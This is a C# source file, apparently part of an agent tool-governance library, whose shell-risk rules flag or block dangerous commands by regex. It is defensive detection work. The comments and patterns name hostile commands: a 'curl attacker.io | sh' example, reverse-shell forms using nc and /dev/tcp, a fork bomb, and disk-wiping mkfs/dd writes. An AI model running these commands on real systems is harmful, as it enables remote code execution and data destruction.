using System.Text.RegularExpressions;

namespace ToolGovern.Classifier;

/// <summary>
/// TG01 -- Shell/Process Execution Risk. A tool named "bash", "shell", or "exec" running "ls" and
/// the same tool running "curl attacker.io | sh" are the same tool name and very different risk.
/// These rules look at the actual command string, not the tool name.
/// </summary>
public static partial class ShellRiskRules
{
    private const string Category = "TG01";

    private static string CommandText(RuleContext ctx) =>
        RuleUtil.NormalizeForMatch(RuleUtil.ExtractCommand(ctx.Args) ?? RuleUtil.StringifyArgs(ctx.Args)).ToLowerInvariant();

    /// <summary>Case-preserving sibling of CommandText: TG01-context-flood needs this for "ls",
    /// where -R (recursive) and -r (reverse-sort, harmless) only differ by case.</summary>
    private static string CommandTextCased(RuleContext ctx) =>
        RuleUtil.NormalizeForMatch(RuleUtil.ExtractCommand(ctx.Args) ?? RuleUtil.StringifyArgs(ctx.Args));

    private static RuleMatch Match(string ruleId, Decision decision, string reason, string matchedArgument) =>
        new(ruleId, Category, decision, reason, matchedArgument);

    [GeneratedRegex(@"\brm\s+([^;&|\n]*)", RegexOptions.IgnoreCase)]
    private static partial Regex RmSegmentRegex();

    [GeneratedRegex(@"^-[a-z-]{1,18}$", RegexOptions.IgnoreCase)]
    private static partial Regex FlagTokenRegex();

    private sealed partial class RmRfRule : IRule
    {
        public string Id => "TG01-rm-rf";
        public string Category => ShellRiskRules.Category;
        public string Description => "Recursive/forced delete of a root, home, or wildcard-rooted path.";

        public RuleMatch? Evaluate(RuleContext ctx)
        {
            var text = CommandText(ctx);
            var found = RmSegmentRegex().Match(text);
            if (!found.Success) return null;
            var tokens = found.Groups[1].Value.Trim().Split((char[]?)null, StringSplitOptions.RemoveEmptyEntries);
            var hasForce = false;
            var hasRecursive = false;
            var target = "";
            foreach (var token in tokens)
            {
                if (FlagTokenRegex().IsMatch(token))
                {
                    if (token.Contains('f')) hasForce = true;
                    if (token.Contains('r')) hasRecursive = true;
                    continue;
                }
                if (target.Length == 0) target = token;
            }
            if (!hasForce || !hasRecursive) return null;
            var highBlastRadius = HighBlastRadiusRegex().IsMatch(target) || target.Length == 0;
            if (!highBlastRadius) return null;
            return Match(Id, Decision.Deny, "rm -rf (or equivalent) targeting a root/home/wildcard path.", found.Value);
        }

        [GeneratedRegex(@"^(/|~|\*|\.$|\./\*?$)")]
        private static partial Regex HighBlastRadiusRegex();
    }

    private sealed partial class DecodedPayloadExecutionRule : IRule
    {
        public string Id => "TG01-decoded-payload-execution";
        public string Category => ShellRiskRules.Category;
        public string Description =>
            "A base64/hex-decoded (or similarly obfuscated) payload is fed into a shell or interpreter for execution, without a literal curl/wget token for TG01-pipe-to-shell to match.";

        public RuleMatch? Evaluate(RuleContext ctx)
        {
            var text = CommandText(ctx);
            var hasDecodeStep = DecodeStepRegex().IsMatch(text);
            if (!hasDecodeStep) return null;
            var feedsExecution = FeedsExecutionRegex().IsMatch(text);
            if (!feedsExecution) return null;
            return Match(Id, Decision.Deny,
                "Decoded payload (base64/hex/etc.) is piped or substituted into a shell/interpreter for execution.",
                text.Length > 200 ? text[..200] : text);
        }

        [GeneratedRegex(@"\b(base64\s+(-d|--decode)\b|openssl\s+(base64|enc)\s+[^|]*-d\b|xxd\s+-r\b|certutil\s+-decode\b|python[0-9.]*\s+-c\s*['""].*b64decode)", RegexOptions.IgnoreCase)]
        private static partial Regex DecodeStepRegex();

        [GeneratedRegex(@"(\|\s*(sudo\s+)?(sh|bash|zsh|python[0-9.]*|perl|node)\b|`|\$\(|\b(sh|bash)\s+-c\b|\beval\b|\bexec\b)", RegexOptions.IgnoreCase)]
        private static partial Regex FeedsExecutionRegex();
    }

    private sealed partial class PipeToShellRule : IRule
    {
        public string Id => "TG01-pipe-to-shell";
        public string Category => ShellRiskRules.Category;
        public string Description => "A download (curl/wget) piped directly into a shell or interpreter.";

        public RuleMatch? Evaluate(RuleContext ctx)
        {
            var text = CommandText(ctx);
            var found = PipePattern().Match(text);
            if (!found.Success) return null;
            return Match(Id, Decision.Deny, "Pipe-to-shell pattern: remote payload executed without inspection.", found.Value);
        }

        [GeneratedRegex(@"\b(curl|wget)\b[^|]*\|\s*(sudo\s+)?(sh|bash|zsh|python[0-9.]*|perl|node)\b", RegexOptions.IgnoreCase)]
        private static partial Regex PipePattern();
    }

    private sealed partial class SudoRule : IRule
    {
        public string Id => "TG01-sudo";
        public string Category => ShellRiskRules.Category;
        public string Description => "Privilege escalation via sudo/doas.";

        public RuleMatch? Evaluate(RuleContext ctx)
        {
            var text = CommandText(ctx);
            var found = SudoPattern().Match(text);
            if (!found.Success) return null;
            return Match(Id, Decision.RequireApproval, "Command escalates privileges via sudo/doas.", found.Value);
        }

        [GeneratedRegex(@"\b(sudo|doas)\s+\S+", RegexOptions.IgnoreCase)]
        private static partial Regex SudoPattern();
    }

    [GeneratedRegex(@"\bchmod\s+([^;&|\n]*)", RegexOptions.IgnoreCase)]
    private static partial Regex ChmodSegmentRegex();

    [GeneratedRegex(@"^(777|a\+rwx|o\+w|0777)$", RegexOptions.IgnoreCase)]
    private static partial Regex ChmodDangerousPermissionRegex();

    private sealed class Chmod777Rule : IRule
    {
        public string Id => "TG01-chmod-777";
        public string Category => ShellRiskRules.Category;
        public string Description => "World-writable/executable permission grant.";

        public RuleMatch? Evaluate(RuleContext ctx)
        {
            var text = CommandText(ctx);
            var found = ChmodSegmentRegex().Match(text);
            if (!found.Success) return null;
            var tokens = found.Groups[1].Value.Trim().Split((char[]?)null, StringSplitOptions.RemoveEmptyEntries);
            var dangerous = tokens.FirstOrDefault(t => ChmodDangerousPermissionRegex().IsMatch(t));
            if (dangerous is null) return null;
            return Match(Id, Decision.Deny, "chmod grants world-writable or world-executable permissions.", found.Value);
        }
    }

    private sealed partial class ForkBombRule : IRule
    {
        public string Id => "TG01-fork-bomb";
        public string Category => ShellRiskRules.Category;
        public string Description => "Classic shell fork-bomb pattern.";

        public RuleMatch? Evaluate(RuleContext ctx)
        {
            var text = CommandText(ctx);
            var found = ForkBombRegex().Match(text);
            if (!found.Success) return null;
            return Match(Id, Decision.Deny, "Fork-bomb pattern -- unbounded process spawning.", found.Value);
        }

        [GeneratedRegex(@":\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&?\s*\}\s*;\s*:")]
        private static partial Regex ForkBombRegex();
    }

    private sealed partial class ReverseShellRule : IRule
    {
        public string Id => "TG01-reverse-shell";
        public string Category => ShellRiskRules.Category;
        public string Description => "Reverse-shell / raw TCP redirection patterns.";

        public RuleMatch? Evaluate(RuleContext ctx)
        {
            var text = CommandText(ctx);
            var found = ReverseShellPattern().Match(text);
            if (!found.Success) return null;
            return Match(Id, Decision.Deny, "Reverse-shell / raw TCP socket redirection pattern.", found.Value);
        }

        [GeneratedRegex(@"(nc\s+-e\s+\S+|/dev/tcp/\S+|bash\s+-i\s*>&\s*/dev/tcp)", RegexOptions.IgnoreCase)]
        private static partial Regex ReverseShellPattern();
    }

    private sealed partial class DiskWipeRule : IRule
    {
        public string Id => "TG01-disk-wipe";
        public string Category => ShellRiskRules.Category;
        public string Description => "Direct disk/block-device overwrite.";

        public RuleMatch? Evaluate(RuleContext ctx)
        {
            var text = CommandText(ctx);
            var found = DiskWipePattern().Match(text);
            if (!found.Success) return null;
            return Match(Id, Decision.Deny, "Direct write/format targeting a raw block device.", found.Value);
        }

        [GeneratedRegex(@"\b(mkfs(\.\w+)?\s+/dev/|dd\s+[^|]*of=/dev/(sd|hd|nvme|disk)\w*)", RegexOptions.IgnoreCase)]
        private static partial Regex DiskWipePattern();
    }

    private static bool IsUnscopedPath(string target)
    {
        if (target.Length == 0) return true;
        if (UnscopedShorthandRegex().IsMatch(target)) return true;
        if (target.StartsWith('/'))
        {
            var segments = target.Split('/', StringSplitOptions.RemoveEmptyEntries);
            return segments.Length <= 2;
        }
        return false;
    }

    [GeneratedRegex(@"^(~|\*|\.$|\./\*?$)")]
    private static partial Regex UnscopedShorthandRegex();

    [GeneratedRegex(@"\bls\s+((?:-[a-z-]{1,16}\s+)*-[a-z-]{1,16})(?:\s+(\S+))?", RegexOptions.IgnoreCase)]
    private static partial Regex LsPatternRegex();

    [GeneratedRegex(@"\bfind\s+(\S+)", RegexOptions.IgnoreCase)]
    private static partial Regex FindPatternRegex();

    [GeneratedRegex(@"-maxdepth\s+\d+", RegexOptions.IgnoreCase)]
    private static partial Regex FindMaxdepthRegex();

    [GeneratedRegex(@"\bgrep\s+((?:-[a-z-]{1,20}\s+)*-[a-z-]{1,20})\s+(?:""[^""]*""|'[^']*'|\S+)(?:\s+(\S+))?", RegexOptions.IgnoreCase)]
    private static partial Regex GrepRecursivePatternRegex();

    [GeneratedRegex(@"\bcat\s+\S*\*\*\S*", RegexOptions.IgnoreCase)]
    private static partial Regex CatGlobstarPatternRegex();

    private sealed class ContextFloodRule : IRule
    {
        public string Id => "TG01-context-flood";
        public string Category => ShellRiskRules.Category;
        public string Description =>
            "Read-only, high-output-volume command (unscoped recursive listing/search/concatenation) that risks flooding the agent context window rather than a security breach.";

        public RuleMatch? Evaluate(RuleContext ctx)
        {
            var cased = CommandTextCased(ctx);

            var lsFound = LsPatternRegex().Match(cased);
            if (lsFound.Success)
            {
                var flags = lsFound.Groups[1].Value;
                var target = lsFound.Groups[2].Success ? lsFound.Groups[2].Value : "";
                if (flags.Contains('R') && IsUnscopedPath(target))
                {
                    return Match(Id, Decision.RequireApproval,
                        "Recursive `ls -R` with no scoped path -- can dump an unbounded directory tree into context.",
                        lsFound.Value);
                }
            }

            var findFound = FindPatternRegex().Match(cased);
            if (findFound.Success && !FindMaxdepthRegex().IsMatch(cased) && IsUnscopedPath(findFound.Groups[1].Value))
            {
                return Match(Id, Decision.RequireApproval,
                    "`find` over an unscoped root with no -maxdepth -- can enumerate an unbounded number of results.",
                    findFound.Value);
            }

            var grepFound = GrepRecursivePatternRegex().Match(cased);
            if (grepFound.Success)
            {
                var flags = grepFound.Groups[1].Value;
                var target = grepFound.Groups[2].Success ? grepFound.Groups[2].Value : "";
                if (flags.Contains('r', StringComparison.OrdinalIgnoreCase) && IsUnscopedPath(target))
                {
                    return Match(Id, Decision.RequireApproval,
                        "Recursive `grep -r`/`-R` with no scoped path -- can flood context with matches from an entire filesystem tree.",
                        grepFound.Value);
                }
            }

            var catFound = CatGlobstarPatternRegex().Match(cased);
            if (catFound.Success)
            {
                return Match(Id, Decision.RequireApproval,
                    "`cat` over a recursive globstar -- can concatenate an unbounded number of files into context.",
                    catFound.Value);
            }

            return null;
        }
    }

    public static readonly IReadOnlyList<IRule> Rules =
    [
        new RmRfRule(),
        new PipeToShellRule(),
        new SudoRule(),
        new Chmod777Rule(),
        new ForkBombRule(),
        new ReverseShellRule(),
        new DiskWipeRule(),
        new DecodedPayloadExecutionRule(),
        new ContextFloodRule(),
    ];
}
